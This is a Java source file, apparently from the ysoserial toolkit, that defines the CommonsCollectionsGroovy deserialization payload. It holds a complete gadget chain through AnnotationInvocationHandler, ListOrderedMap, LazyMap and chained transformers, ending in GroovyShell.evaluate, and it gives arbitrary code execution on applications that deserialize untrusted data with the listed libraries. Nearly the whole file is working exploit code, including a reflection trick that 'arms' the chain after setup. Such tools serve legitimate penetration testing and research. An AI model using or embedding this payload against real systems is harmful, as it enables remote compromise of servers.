package ysoserial.payloads;


import groovy.lang.GroovyShell;

import java.lang.reflect.InvocationHandler;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

import javax.management.MXBean;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.ListOrderedMap;

import ysoserial.annotation.Bind;
import ysoserial.interfaces.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Gadget chain:	
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					ListOrderedMap.EntrySetView.iterator()
						ListOrderedMap.ListOrderedIterator.next()
						ListOrderedMap.ListOrderedMapEntry.value()
							LazyMap.get()
								ChainedTransformer.transform()
									ConstantTransformer.transform()
									InvokerTransformer.transform()
										Method.invoke()				
											Class.getMethod()
									InvokerTransformer.transform()
										Method.invoke()
											GroovyShell.execute()								
	
	Requires:
		commons-collections
		groovy
		
	Result:
		Arbitrary Groovy code executed
		
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1", "org.codehaus.groovy:groovy:2.3.9"})
@PayloadTest( skip = "Not shell command, TODO" )
public class CommonsCollectionsGroovy extends PayloadRunner implements ObjectPayload<InvocationHandler> {
	
	@Bind private String command;
	
	public InvocationHandler getObject() throws Exception {
		final String[] execArgs = new String[] { command };
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
			new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(GroovyShell.class),
				new InstantiateTransformer( new Class[0], new Object[0] ),
				new InvokerTransformer(
						"evaluate", new Class[] { String.class }, execArgs),
				new ConstantTransformer( new HashSet() ) };

		final Map innerMap = new HashMap();		
		innerMap.put( "3", "x" );
		innerMap.put( "4", "y" );
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		final Map lomMap = ListOrderedMap.decorate( lazyMap );
		
		ArrayList lomInsert = new ArrayList();
		lomInsert.add( "value" );
		Reflections.setFieldValue( lomMap, "insertOrder", lomInsert);
		
		final InvocationHandler handler = createMemoizedInvocationHandler(lomMap);
		
		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain	
				
		return handler;
	}
	
	public InvocationHandler getObject(String command) throws Exception {
		throw new UnsupportedOperationException( "Use the no-args bind version" );
	}
	
	public static InvocationHandler createMemoizedInvocationHandler(Map<String, Object> map) throws Exception {
		return (InvocationHandler)Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(new Object[] { MXBean.class, map });
	}
	
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollectionsGroovy.class, new String[] { "print 'Hello';" });
	}
}
